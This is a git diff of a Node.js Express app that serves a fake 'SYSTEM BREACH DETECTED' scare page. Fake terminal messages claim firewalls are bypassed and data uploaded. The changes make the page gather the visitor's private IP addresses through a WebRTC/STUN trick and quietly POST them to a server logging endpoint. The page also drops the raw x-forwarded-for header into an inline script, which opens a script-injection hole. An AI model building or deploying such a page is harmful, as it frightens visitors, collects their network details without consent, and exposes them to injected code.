@@ -16,13 +16,8 @@ if (!fs.existsSync(logDir)) {
 // Fungsi untuk mendapatkan IP pengguna
 function getClientIP(req) {
     let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
-
-    if (ip.includes(",")) {
-        ip = ip.split(",")[0].trim();
-    }
-
+    if (ip.includes(",")) ip = ip.split(",")[0].trim();
     ip = ip.replace(/^::ffff:/, "").trim();
-
     return ip || "Unknown";
 }
 
@@ -46,61 +41,118 @@ app.use((req, res, next) => {
 app.get("/", (req, res) => {
     res.send(`
         <style>
+            @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
             body {
                 background-color: black;
                 color: #00ff00;
-                font-family: "Courier New", monospace;
+                font-family: 'VT323', monospace;
                 text-align: center;
-                padding: 50px;
+                padding: 20px;
+                font-size: 22px;
             }
+
             h1 {
-                font-size: 40px;
-                text-shadow: 0 0 10px #00ff00;
+                font-size: 32px;
+                text-shadow: 0px 0px 10px #00ff00;
+                animation: glitch 1s infinite alternate;
             }
+
+            @keyframes glitch {
+                0% { text-shadow: 2px 2px 5px red, -2px -2px 5px blue; }
+                100% { text-shadow: -2px -2px 5px red, 2px 2px 5px blue; }
+            }
+
             .blinking {
-                animation: blink 1s infinite;
+                animation: blink 1s infinite alternate;
             }
+
             @keyframes blink {
                 0% { opacity: 1; }
-                50% { opacity: 0; }
-                100% { opacity: 1; }
+                100% { opacity: 0; }
+            }
+
+            .terminal {
+                width: 80%;
+                background: rgba(0, 0, 0, 0.8);
+                border: 2px solid #00ff00;
+                padding: 15px;
+                text-align: left;
+                overflow: hidden;
+                margin: auto;
+                font-size: 18px;
+                white-space: pre-line;
+            }
+
+            #output {
+                color: #00ff00;
+                overflow: hidden;
+                white-space: pre;
             }
         </style>
-        <h1 class="blinking">⚠ SYSTEM BREACH DETECTED ⚠</h1>
-        <p>IP Public: <span id="public-ip">Detecting...</span></p>
-        <p>IP Private: <span id="private-ip">Detecting...</span></p>
-        <audio id="alarm" src="https://www.myinstants.com/media/sounds/siren.mp3" loop></audio>
+
+        <h1>⚠ SYSTEM BREACH DETECTED ⚠</h1>
+        <div class="terminal">
+            <div id="output">[ SYSTEM SCANNING... ]</div>
+        </div>
+        <p id="public-ip">IP Public: Scanning...</p>
+        <p id="private-ip" class="blinking">[ ACCESSING PRIVATE NETWORK... ]</p>
+        <audio id="hacker-sound" src="https://www.soundjay.com/button/beep-07.wav" autoplay loop></audio>
+        <button onclick="document.getElementById('hacker-sound').pause()">🔇 Mute</button>
+
         <script>
-            document.getElementById("alarm").play();
+            document.getElementById("public-ip").innerText = "IP Public: ${getClientIP(req)}";
 
-            // Ambil IP Public dari server
-            fetch("/get-ip").then(res => res.json()).then(data => {
-                document.getElementById("public-ip").innerText = data.ip;
-            });
-
-            // Ambil IP Private dengan WebRTC
             async function getLocalIPs() {
                 const ips = new Set();
-                const pc = new RTCPeerConnection({ iceServers: [] });
+                const pc = new RTCPeerConnection({ 
+                    iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
+                });
 
                 pc.createDataChannel("");
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
                 pc.onicecandidate = event => {
-                    if (event.candidate && event.candidate.candidate.includes("udp")) {
+                    if (event.candidate) {
                         const ip = event.candidate.candidate.split(" ")[4];
                         ips.add(ip);
-                    } else if (!event.candidate) {
-                        document.getElementById("private-ip").innerText = [...ips].join(", ") || "Tidak ditemukan";
+                    } else {
+                        const privateIP = [...ips].join(", ") || "Tidak ditemukan";
+                        document.getElementById("private-ip").innerText = "IP Private: " + privateIP;
+                        
+                        fetch("/log-ip", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ privateIP })
+                        }).catch(err => console.error("Gagal mengirim IP Private:", err));
+
                         pc.close();
                     }
                 };
             }
             getLocalIPs();
+
+            // Efek teks terminal
+            const commands = [
+                "[ SYSTEM BREACH INITIATED... ]",
+                "[ BYPASSING FIREWALL... SUCCESS ]",
+                "[ SCANNING NETWORK PORTS... ]",
+                "[ COLLECTING SENSITIVE DATA... ]",
+                "[ UPLOADING TO REMOTE SERVER... DONE ]"
+            ];
+
+            let i = 0;
+            function typeEffect() {
+                if (i < commands.length) {
+                    document.getElementById("output").innerHTML += "\\n" + commands[i];
+                    i++;
+                    setTimeout(typeEffect, 2000);
+                }
+            }
+            setTimeout(typeEffect, 1000);
         </script>
     `);
 });
-
 
 // Endpoint untuk mencatat IP Private ke server
 app.post("/log-ip", express.json(), (req, res) => {
